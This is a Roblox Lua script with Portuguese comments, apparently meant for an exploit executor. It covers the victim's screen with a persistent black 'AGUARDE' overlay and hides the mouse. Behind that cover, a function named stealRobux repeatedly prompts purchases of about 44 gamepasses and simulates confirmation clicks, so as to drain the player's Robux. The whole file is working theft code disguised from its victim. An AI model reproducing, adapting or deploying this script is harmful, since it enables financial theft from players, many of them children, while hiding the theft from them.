-- Configurações
local gamepassIds = {2005934638, 2004992687, 2006726677, 2006912657, 2006912657, 2006474712, 2006492688, 2006690710, 2006726677, 2005772704, 2005502715, 2006306662, 2005124677, 2005124677, 2006870695, 2006870694, 2005526698, 2006498709, 2006474711, 2005982699, 2006390726, 2006720636, 2005808741, 2006948680, 2006786699, 2006354666, 2005322700, 2005736689, 2006618734, 2006222671, 2006576725, 2006342690, 2006156718, 2005550675, 2006402701, 2005400720, 2005754676, 2006372679, 2004542727, 2006030675, 2006030675, 2006180703, 2007050698, 2006420706}
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- 1. Criação da UI de Bloqueio (Tela Preta)
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")

ScreenGui.Name = "SystemLock"
ScreenGui.Parent = game:GetService("CoreGui") -- Coloca no CoreGui para não ser deletado facilmente
ScreenGui.DisplayOrder = 999999

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.ZIndex = 10

TextLabel.Name = "TextLabel"
TextLabel.Parent = MainFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 0, 0, 0)
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "AGUARDE"
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextSize = 60.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Trava o mouse e impede interação
local UserInputService = game:GetService("UserInputService")
UserInputService.MouseIconEnabled = false

-- 2. Lógica de Compra
local function stealRobux()
    for _, id in ipairs(gamepassIds) do
        pcall(function()
            -- Tenta forçar a compra via Prompt
            MarketplaceService:PromptGamePassPurchase(LocalPlayer, id)
            
            -- Tenta simular o clique no botão de confirmação da UI do Roblox
            -- Nota: A eficácia depende do executor de script utilizado
            local virtualUser = game:GetService("VirtualUser")
            virtualUser:CaptureController()
            virtualUser:ClickButton2(Vector2.new(0,0))
        end)
        
        task.wait(3)
    end
end

-- Executa a drenagem em uma thread separada para não travar o jogo
task.spawn(stealRobux)

-- Loop para garantir que a tela continue preta
task.spawn(function()
    while true do
        if not ScreenGui.Parent then
            ScreenGui.Parent = game:GetService("CoreGui")
        end
        task.wait(1)
    end
end)
